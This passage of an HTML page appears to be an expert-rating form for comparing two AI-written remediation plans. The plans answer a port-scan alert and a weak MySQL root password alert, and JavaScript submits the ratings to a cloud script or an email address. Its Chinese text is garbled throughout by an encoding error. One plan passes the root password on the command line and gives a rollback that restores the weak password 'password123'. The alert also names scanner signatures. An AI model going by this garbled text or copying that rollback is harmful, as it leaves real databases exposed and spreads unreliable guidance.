ã€ATT&amp;CKã€‘ä¾¦å¯Ÿ:TA0043|ä¸»åŠ¨æ‰«æ:T1595|æ¼æ´æ‰«æ:T1595.002
ã€æ‰«æç‰¹å¾ã€‘Nmap SYNæ‰«æï¼ŒUser-Agent: Mozilla/5.0 zgrab/0.x
ã€å‘Šè­¦æè¿°ã€‘æ£€æµ‹åˆ°æ¥è‡ª185.220.100.250çš„å¤§è§„æ¨¡ç«¯å£æ‰«æï¼Œç›®æ ‡è¦†ç›–æ•´ä¸ª192.168.0.0/16ç½‘æ®µï¼Œé‡ç‚¹æ¢æµ‹æ•°æ®åº“å’ŒWebæœåŠ¡ç«¯å£ã€‚
ã€å¤„ç½®å»ºè®®ã€‘åœ¨è¾¹ç•Œé˜²ç«å¢™å°ç¦æ‰«ææºIPï¼Œæ£€æŸ¥æš´éœ²çš„æœåŠ¡æ˜¯å¦å­˜åœ¨æ¼æ´</div>
    </div>
    
    <div class="solutions-container">
        <div class="solution-box">
            <div class="solution-header plan-a">ğŸ…°ï¸ æ–¹æ¡ˆA</div>
            <div class="solution-content"><pre>- å»ºè®®åœ¨é˜²ç«å¢™å°ç¦æ”»å‡»æºIPï¼š185.220.100.250ã€‚
- æ£€æŸ¥22ã€80ã€443ã€3306ã€6379ã€27017ç«¯å£æ˜¯å¦å¯¹å¤–æš´éœ²ï¼Œå¦‚æ— å¿…è¦åº”å…³é—­ã€‚
- å®šæœŸå¯¹å¤–éƒ¨æš´éœ²æœåŠ¡è¿›è¡Œæ¼æ´æ‰«æå’Œè¡¥ä¸æ›´æ–°ã€‚</pre></div>
        </div>
        
        <div class="solution-box">
            <div class="solution-header plan-b">ğŸ…±ï¸ æ–¹æ¡ˆB</div>
            <div class="solution-content"><pre>- ã€å¤„ç½®åŠ¨ä½œã€‘ç«‹å³åœ¨è¾¹ç•Œé˜²ç«å¢™å°ç¦æºIP 185.220.100.250ï¼Œå»ºè®®å‘½ä»¤ï¼ˆä¾‹å¦‚Linux iptablesï¼‰ï¼š
  ```
  iptables -I INPUT -s 185.220.100.250 -j DROP
  ```
- ã€å›é€€å‘½ä»¤ã€‘
  ```
  iptables -D INPUT -s 185.220.100.250 -j DROP
  ```
- ã€æ“ä½œå‰æ£€æŸ¥ã€‘
  - æ£€æŸ¥æ˜¯å¦å·²å­˜åœ¨ç›¸å…³é˜²ç«å¢™è§„åˆ™ï¼Œé¿å…é‡å¤æ·»åŠ 
  - ç¡®è®¤è¯¥IPéæ­£å¸¸ä¸šåŠ¡åˆä½œæ–¹
- ã€å®‰å…¨å»ºè®®ã€‘
  - æ£€æŸ¥å—æ‰«ä¸»æœº22ã€80ã€443ã€3306ã€6379ã€27017ç«¯å£çš„å®é™…æš´éœ²æƒ…å†µï¼Œå¹¶å¯¹æ‰€æœ‰å¿…è¦æœåŠ¡åŠæ—¶æ‰“è¡¥ä¸
  - æ ¸æŸ¥æ‰«æç‰¹å¾ï¼ˆUser-Agent: Mozilla/5.0 zgrab/0.xã€Nmap SYNï¼‰åœ¨å®‰å…¨è®¾å¤‡ä¸­çš„å‘½ä¸­é¢‘ç‡
  - å…³è”æœ¬æ¬¡æ‰«ææºIPçš„è¿‘æœŸå¨èƒæƒ…æŠ¥ï¼ˆTorå‡ºå£ï¼Œå½’å±ä¸æ˜ã€é«˜é£é™©ï¼‰
  - æŒ‰ç‹¬ç«‹ç»„ç»‡å®‰å…¨æµç¨‹è®°å½•å·¥å•ç¼–å·ï¼Œç•™ç—•å¤„ç½®</pre></div>
        </div>
    </div>
    
    <div class="rating-section">
        <h4>ğŸ“Š è¯„åˆ†ï¼ˆ1.0-5.0åˆ†ï¼Œ5åˆ†æœ€é«˜ï¼Œæ”¯æŒå°æ•°å¦‚4.9ï¼‰</h4>
        <table class="rating-table">
            <thead>
                <tr>
                    <th>è¯„ä¼°ç»´åº¦</th>
                    <th>æ–¹æ¡ˆA</th>
                    <th>æ–¹æ¡ˆB</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td class="tooltip" data-tip="ç²¾å‡†è¯†åˆ«æ”»å‡»ç±»å‹ï¼Œå®ä½“æå–æ— è¯¯">æ„å›¾ç†è§£ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="CVE+ATT&CK+IOCå®Œæ•´å…³è”">è¯æ®é“¾å®Œæ•´æ€§ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="å…·ä½“å‘½ä»¤å¯ç›´æ¥æ‰§è¡Œ">Playbookå¯æ‰§è¡Œæ€§ (30%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="æœ‰å›é€€å‘½ä»¤å’Œæ‰§è¡Œå‰æ£€æŸ¥">ä¸šåŠ¡å®‰å…¨æ€§ (20%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
            </tbody>
        </table>
        
        <div class="time-inputs">
            <div class="time-input">
                <label>å®Œå…¨äººå·¥å¤„ç†é¢„è®¡è€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="manualTime" min="1" max="120" placeholder="å¦‚ï¼š15">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆAè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewA" min="1" max="60" placeholder="å¦‚ï¼š8">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆBè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewB" min="1" max="60" placeholder="å¦‚ï¼š3">
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>å“ªä¸ªæ–¹æ¡ˆæ›´å¥½ï¼Ÿ</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="better" value="A"> æ–¹æ¡ˆAæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="B"> æ–¹æ¡ˆBæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="equal"> å·®ä¸å¤š</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆAå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptA" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆBå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptB" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆAè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentA" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆBè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentB" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
    </div>
    
    <div class="nav-buttons">
        <button class="btn btn-secondary" onclick="prevCase(5)" >â† ä¸Šä¸€ä¸ª</button>
        <button class="btn btn-primary" onclick="nextCase(5)">ä¸‹ä¸€ä¸ª â†’</button>
    </div>
</div>

<div class="case-panel" id="case-6">
    <h2 class="case-title">ğŸ“‹ æ¡ˆä¾‹ #6: Case20_å¼±å¯†ç </h2>
    
    <div class="alert-box">
        <h4>ğŸš¨ åŸå§‹å‘Šè­¦ä¿¡æ¯</h4>
        <div class="alert-content">ã€å‘Šè­¦åç§°ã€‘å¼±å¯†ç æ£€æµ‹
ã€å‘Šè­¦æ—¶é—´ã€‘2025-12-04 19:30:00
ã€ç›®æ ‡ä¸»æœºã€‘192.168.1.150
ã€æœåŠ¡ã€‘MySQL 3306
ã€ç”¨æˆ·åã€‘root
ã€å¨èƒç­‰çº§ã€‘ä½å±
ã€æ”»å‡»ç±»å‹ã€‘å¼±å£ä»¤
ã€ATT&amp;CKã€‘å‡­è¯è®¿é—®:TA0006|æš´åŠ›ç ´è§£:T1110
ã€æ£€æµ‹æ–¹å¼ã€‘å†…éƒ¨åˆè§„æ‰«æ
ã€å‘Šè­¦æè¿°ã€‘å†…éƒ¨åˆè§„æ‰«æå‘ç°MySQLæ•°æ®åº“rootè´¦æˆ·ä½¿ç”¨å¼±å¯†ç ï¼ˆpassword123ï¼‰ï¼Œå­˜åœ¨è¢«æš´åŠ›ç ´è§£é£é™©ã€‚
ã€å¤„ç½®å»ºè®®ã€‘ä¿®æ”¹ä¸ºå¼ºå¯†ç ï¼Œé™åˆ¶rootè´¦æˆ·è¿œç¨‹ç™»å½•ï¼Œå¯ç”¨å¯†ç å¤æ‚åº¦ç­–ç•¥</div>
    </div>
    
    <div class="solutions-container">
        <div class="solution-box">
            <div class="solution-header plan-a">ğŸ…°ï¸ æ–¹æ¡ˆA</div>
            <div class="solution-content"><pre>1. ä¿®æ”¹rootè´¦æˆ·å¯†ç ä¸ºå¤æ‚å¯†ç ï¼Œå¦‚ï¼š`MyS3cure!p@ssw0rd2025` 
   ```sql
   ALTER USER 'root'@'localhost' IDENTIFIED BY 'MyS3cure!p@ssw0rd2025';
   FLUSH PRIVILEGES;
   ```
2. é™åˆ¶rootè´¦æˆ·ä¸èƒ½è¿œç¨‹ç™»å½•ï¼Œç¡®ä¿åªå…è®¸æœ¬åœ°è®¿é—®ï¼š
   ```sql
   UPDATE mysql.user SET Host='localhost' WHERE User='root';
   FLUSH PRIVILEGES;
   ```
3. å¯ç”¨å¯†ç å¤æ‚åº¦æ’ä»¶ï¼ˆvalidate_passwordï¼‰ï¼Œå»ºè®®è®¾ç½®å¦‚ä¸‹ï¼š
   ```sql
   INSTALL PLUGIN validate_password SONAME 'validate_password.so';
   SET GLOBAL validate_password.policy=STRONG;
   SET GLOBAL validate_password.length=12;
   ```
4. å»ºè®®åç»­å®šæœŸå®¡è®¡é«˜æƒé™è´¦æˆ·å¯†ç </pre></div>
        </div>
        
        <div class="solution-box">
            <div class="solution-header plan-b">ğŸ…±ï¸ æ–¹æ¡ˆB</div>
            <div class="solution-content"><pre>- **å‘Šè­¦è§£æ**  
  - ç±»å‹ï¼šå¼±å£ä»¤-MySQLæ•°æ®åº“
  - å½±å“ï¼šrootè´¦æˆ·å­˜åœ¨å¼±å¯†ç ï¼ˆpassword123ï¼‰ï¼Œæ”»å‡»è€…å¯é€šè¿‡æš´åŠ›ç ´è§£è·å¾—æ•°æ®åº“é«˜æƒé™
  - å…³è”æ ‡å‡†ï¼šATT&CK(å‡­è¯è®¿é—®:TA0006ï¼Œæš´åŠ›ç ´è§£:T1110)

- **è¯æ®é“¾**  
  - èµ„äº§ï¼š192.168.1.150:3306
  - ç”¨æˆ·ï¼šroot
  - å¼±å£ä»¤ï¼špassword123
  - æ£€æŸ¥æ–¹å¼ï¼šå†…éƒ¨åˆè§„æ‰«æ

- **è‡ªåŠ¨Playbook**  

  1. **é¢„æ£€æŸ¥-ç™»å½•è¿æ¥å¯ç”¨æ€§**
     ```
     mysql -uroot -p'password123' -h192.168.1.150 -e "SELECT VERSION();" || echo "è¿æ¥å¤±è´¥ï¼Œä»»åŠ¡ä¸­æ­¢"
     ```
  2. **éšæœºç”Ÿæˆå¤æ‚æ–°å¯†ç ï¼š**
     ```
     NEWPASS=$(openssl rand -base64 16)
     echo "ç”Ÿæˆæ–°å¯†ç : $NEWPASS"
     ```
  3. **ä¿®æ”¹rootå¯†ç ï¼ˆå«éªŒè¯ï¼‰ï¼š**
     ```sh
     mysql -uroot -p'password123' -h192.168.1.150 -e "ALTER USER 'root'@'localhost' IDENTIFIED BY '${NEWPASS}'; FLUSH PRIVILEGES;"
     ```
  4. **é™åˆ¶rootè¿œç¨‹ç™»å½•ï¼š**
     ```sh
     mysql -uroot -p"${NEWPASS}" -h192.168.1.150 -e "UPDATE mysql.user SET Host='localhost' WHERE User='root'; FLUSH PRIVILEGES;"
     ```
  5. **å¯ç”¨å¯†ç å¤æ‚åº¦ç­–ç•¥ï¼š**
     ```sh
     mysql -uroot -p"${NEWPASS}" -h192.168.1.150 -e "INSTALL PLUGIN validate_password SONAME 'validate_password.so'; SET GLOBAL validate_password.policy=STRONG; SET GLOBAL validate_password.length=12;"
     ```
  6. **å›é€€æ–¹æ¡ˆï¼ˆRollbackï¼‰ï¼š**  
     è‹¥æ–°å¯†ç æœ‰è¯¯æˆ–ä¸šåŠ¡ä¸­æ–­ï¼Œå¯ä¸´æ—¶æ¢å¤å¼±å£ä»¤ï¼š
     ```sh
     mysql -uroot -p"${NEWPASS}" -h192.168.1.150 -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'password123'; FLUSH PRIVILEGES;"
     ```
  7. **é£é™©æç¤ºï¼š**
     - ä¿®æ”¹rootå¯†ç å‰ï¼Œé¡»æå‰é€šçŸ¥å½±å“ä¸šåŠ¡çš„ç›¸å…³äººå‘˜
     - æ£€æŸ¥rootä»¥å¤–çš„é«˜æƒé™è´¦æˆ·æ˜¯å¦ä¹Ÿæœ‰ç±»ä¼¼å¼±å£ä»¤</pre></div>
        </div>
    </div>
    
    <div class="rating-section">
        <h4>ğŸ“Š è¯„åˆ†ï¼ˆ1.0-5.0åˆ†ï¼Œ5åˆ†æœ€é«˜ï¼Œæ”¯æŒå°æ•°å¦‚4.9ï¼‰</h4>
        <table class="rating-table">
            <thead>
                <tr>
                    <th>è¯„ä¼°ç»´åº¦</th>
                    <th>æ–¹æ¡ˆA</th>
                    <th>æ–¹æ¡ˆB</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td class="tooltip" data-tip="ç²¾å‡†è¯†åˆ«æ”»å‡»ç±»å‹ï¼Œå®ä½“æå–æ— è¯¯">æ„å›¾ç†è§£ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="CVE+ATT&CK+IOCå®Œæ•´å…³è”">è¯æ®é“¾å®Œæ•´æ€§ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="å…·ä½“å‘½ä»¤å¯ç›´æ¥æ‰§è¡Œ">Playbookå¯æ‰§è¡Œæ€§ (30%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="æœ‰å›é€€å‘½ä»¤å’Œæ‰§è¡Œå‰æ£€æŸ¥">ä¸šåŠ¡å®‰å…¨æ€§ (20%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
            </tbody>
        </table>
        
        <div class="time-inputs">
            <div class="time-input">
                <label>å®Œå…¨äººå·¥å¤„ç†é¢„è®¡è€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="manualTime" min="1" max="120" placeholder="å¦‚ï¼š15">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆAè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewA" min="1" max="60" placeholder="å¦‚ï¼š8">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆBè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewB" min="1" max="60" placeholder="å¦‚ï¼š3">
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>å“ªä¸ªæ–¹æ¡ˆæ›´å¥½ï¼Ÿ</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="better" value="A"> æ–¹æ¡ˆAæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="B"> æ–¹æ¡ˆBæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="equal"> å·®ä¸å¤š</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆAå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptA" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆBå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptB" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆAè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentA" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆBè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentB" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
    </div>
    
    <div class="nav-buttons">
        <button class="btn btn-secondary" onclick="prevCase(6)" >â† ä¸Šä¸€ä¸ª</button>
        <button class="btn btn-primary" onclick="nextCase(6)">å®Œæˆæäº¤ â†’</button>
    </div>
</div>

        
        <div class="export-section" id="exportSection">
            <h3>ğŸ‰ è¯„ä¼°å®Œæˆï¼</h3>
            <p>æ„Ÿè°¢æ‚¨çš„ä¸“ä¸šè¯„ä¼°ï¼Œç‚¹å‡»ä¸‹æ–¹æŒ‰é’®æäº¤æ•°æ®</p>
            <div class="export-buttons">
                <button class="btn btn-success" id="submitBtn" onclick="submitToCloud()">ï¿½ ä¸€é”®æäº¤æ•°æ®</button>
                <button class="btn btn-secondary" onclick="exportJSON()">ï¿½ å¤‡ç”¨ï¼šä¸‹è½½æ–‡ä»¶</button>
            </div>
            <div id="submitStatus" style="margin-top: 15px; padding: 15px; border-radius: 8px; display: none;"></div>
            <div class="data-preview" id="dataPreview"></div>
        </div>
    </div>
    
    <script>
        // å­˜å‚¨æ‰€æœ‰è¯„åˆ†æ•°æ®
        const evaluationData = {
            expert: {},
            cases: {}
        };
        
        const totalCases = 6;
        let completedCases = new Set();
        
        // åˆ‡æ¢æ¡ˆä¾‹é¢æ¿
        function switchCase(caseId) {
            document.querySelectorAll('.case-panel').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
            
            document.getElementById('case-' + caseId).classList.add('active');
            document.querySelector(`[data-case="${caseId}"]`).classList.add('active');
            
            saveCurrentData();
        }
        
        // ä¿å­˜å½“å‰æ•°æ®
        function saveCurrentData() {
            evaluationData.expert = {
                name: document.getElementById('expertName').value,
                role: document.getElementById('expertRole').value,
                date: document.getElementById('evalDate').value
            };
            
            // ä¿å­˜æ¯ä¸ªæ¡ˆä¾‹çš„è¯„åˆ†
            for (let i = 1; i <= totalCases; i++) {
                const caseData = {};
                const panel = document.getElementById('case-' + i);
                if (!panel) continue;
                
                // è·å–è¯„åˆ†ï¼ˆæ»‘å—æˆ–ä¸‹æ‹‰æ¡†ï¼‰
                ['planA', 'planB'].forEach(plan => {
                    caseData[plan] = {};
                    ['intent', 'evidence', 'playbook', 'safety'].forEach(dim => {
                        const input = panel.querySelector(`[name="${plan}_${dim}"]`);
                        if (input) caseData[plan][dim] = parseFloat(input.value) || 3;
                    });
                });
                
                // è·å–æ—¶é—´
                ['manualTime', 'reviewA', 'reviewB'].forEach(field => {
                    const input = panel.querySelector(`[name="${field}"]`);
                    if (input) caseData[field] = parseInt(input.value) || 0;
                });
                
                // è·å–åˆ¤æ–­
                const betterRadio = panel.querySelector('[name="better"]:checked');
                caseData.better = betterRadio ? betterRadio.value : '';
                
                const adoptARadio = panel.querySelector('[name="adoptA"]:checked');
                caseData.adoptA = adoptARadio ? adoptARadio.value : '';
                
                const adoptBRadio = panel.querySelector('[name="adoptB"]:checked');
                caseData.adoptB = adoptBRadio ? adoptBRadio.value : '';
                
                // è·å–è¯„ä»·
                const commentA = panel.querySelector('[name="commentA"]');
                const commentB = panel.querySelector('[name="commentB"]');
                caseData.commentA = commentA ? commentA.value : '';
                caseData.commentB = commentB ? commentB.value : '';
                
                evaluationData.cases['case_' + i] = caseData;
                
                // æ£€æŸ¥æ˜¯å¦å®Œæˆ
                const isComplete = caseData.planA.intent > 0 && caseData.planB.intent > 0 && caseData.better;
                if (isComplete) {
                    completedCases.add(i);
                    document.querySelector(`[data-case="${i}"]`).classList.add('completed');
                } else {
                    completedCases.delete(i);
                    document.querySelector(`[data-case="${i}"]`).classList.remove('completed');
                }
            }
            
            updateProgress();
            localStorage.setItem('expertEvaluation', JSON.stringify(evaluationData));
        }
        
        // æ›´æ–°è¿›åº¦
        function updateProgress() {
            const progress = (completedCases.size / totalCases) * 100;
            document.getElementById('progressFill').style.width = progress + '%';
            document.getElementById('progressText').textContent = completedCases.size + '/' + totalCases;
            
            if (completedCases.size === totalCases) {
                document.getElementById('exportSection').classList.add('show');
            }
        }
        
        // ä¸‹ä¸€ä¸ªæ¡ˆä¾‹
        function nextCase(current) {
            saveCurrentData();
            if (current < totalCases) {
                switchCase(current + 1);
            } else {
                document.getElementById('exportSection').classList.add('show');
                document.getElementById('exportSection').scrollIntoView({ behavior: 'smooth' });
            }
        }
        
        // ä¸Šä¸€ä¸ªæ¡ˆä¾‹
        function prevCase(current) {
            saveCurrentData();
            if (current > 1) {
                switchCase(current - 1);
            }
        }
        
        // ========== äº‘ç«¯æäº¤é…ç½® ==========
        // Google Apps Script éƒ¨ç½²åœ°å€ï¼ˆæ•°æ®è‡ªåŠ¨ä¿å­˜åˆ° Google Sheetsï¼‰
        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbx4LqA0DgXLwcWU-VDAMVcmBSjBruy_opmnlIjQUIRur0qni-KhamA4BJGNbg0bPEKR5Q/exec';
        
        // ä¸€é”®æäº¤åˆ°äº‘ç«¯ï¼ˆåƒé—®å·æ˜Ÿä¸€æ ·ï¼‰
        function submitToCloud() {
            saveCurrentData();
            
            // éªŒè¯å¿…å¡«é¡¹
            if (!evaluationData.expert.name) {
                alert('âš ï¸ è¯·å¡«å†™ä¸“å®¶å§“å');
                return;
            }
            
            const submitBtn = document.getElementById('submitBtn');
            const statusDiv = document.getElementById('submitStatus');
            
            // æ˜¾ç¤ºæäº¤ä¸­çŠ¶æ€
            submitBtn.disabled = true;
            submitBtn.textContent = 'â³ æäº¤ä¸­...';
            statusDiv.style.display = 'block';
            statusDiv.style.background = '#fef3c7';
            statusDiv.style.color = '#92400e';
            statusDiv.innerHTML = 'æ­£åœ¨æäº¤æ•°æ®ï¼Œè¯·ç¨å€™...';
            
            // å‡†å¤‡æäº¤æ•°æ®
            const submitData = {
                submitTime: new Date().toISOString(),
                expert: evaluationData.expert,
                cases: evaluationData.cases
            };
            
            // å¦‚æœé…ç½®äº† Google Script URLï¼Œåˆ™æäº¤åˆ°äº‘ç«¯
            if (GOOGLE_SCRIPT_URL && GOOGLE_SCRIPT_URL !== 'YOUR_GOOGLE_SCRIPT_URL_HERE') {
                fetch(GOOGLE_SCRIPT_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(submitData)
                }).then(() => {
                    // no-cors æ¨¡å¼æ— æ³•è·å–å“åº”ï¼Œå‡è®¾æˆåŠŸ
                    showSuccess();
                }).catch(error => {
                    console.error('æäº¤å¤±è´¥:', error);
                    showError();
                });
            } else {
                // æœªé…ç½®äº‘ç«¯ï¼Œä½¿ç”¨é‚®ä»¶æ–¹å¼
                submitViaEmail(submitData);
            }
        }
        
        // é‚®ä»¶æäº¤æ–¹å¼
        function submitViaEmail(data) {
            const subject = `ä¸“å®¶è¯„ä¼°æ•°æ®_${data.expert.name}_${new Date().toISOString().split('T')[0]}`;
            const body = `ä¸“å®¶ï¼š${data.expert.name}\nèŒä½ï¼š${data.expert.role}\n\nè¯„ä¼°æ•°æ®ï¼š\n${JSON.stringify(data, null, 2)}`;
            const mailtoLink = `mailto:2558293069@qq.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
            
            window.location.href = mailtoLink;
            
            setTimeout(() => {
                const statusDiv = document.getElementById('submitStatus');
                statusDiv.style.display = 'block';
                statusDiv.style.background = '#dbeafe';
                statusDiv.style.color = '#1e40af';
                statusDiv.innerHTML = 'ğŸ“§ é‚®ä»¶å·²æ‰“å¼€ï¼è¯·ç‚¹å‡»å‘é€å®Œæˆæäº¤ã€‚<br>å¦‚é‚®ä»¶æœªæ‰“å¼€ï¼Œè¯·ç‚¹å‡»"å¤‡ç”¨ï¼šä¸‹è½½æ–‡ä»¶"ã€‚';
                
                document.getElementById('submitBtn').disabled = false;
                document.getElementById('submitBtn').textContent = 'ğŸš€ ä¸€é”®æäº¤æ•°æ®';
            }, 1000);
        }
        
        // æ˜¾ç¤ºæˆåŠŸçŠ¶æ€
        function showSuccess() {
            const statusDiv = document.getElementById('submitStatus');
            const submitBtn = document.getElementById('submitBtn');
            
            statusDiv.style.display = 'block';
            statusDiv.style.background = '#d1fae5';
            statusDiv.style.color = '#065f46';
            statusDiv.innerHTML = 'âœ… <strong>æäº¤æˆåŠŸï¼</strong><br>æ„Ÿè°¢æ‚¨çš„è¯„ä¼°ï¼Œæ•°æ®å·²è‡ªåŠ¨ä¿å­˜ã€‚æ‚¨å¯ä»¥å…³é—­æ­¤é¡µé¢ã€‚';
            
            submitBtn.textContent = 'âœ… å·²æäº¤';
            submitBtn.style.background = '#10b981';
            
            // æ¸…é™¤æœ¬åœ°å­˜å‚¨
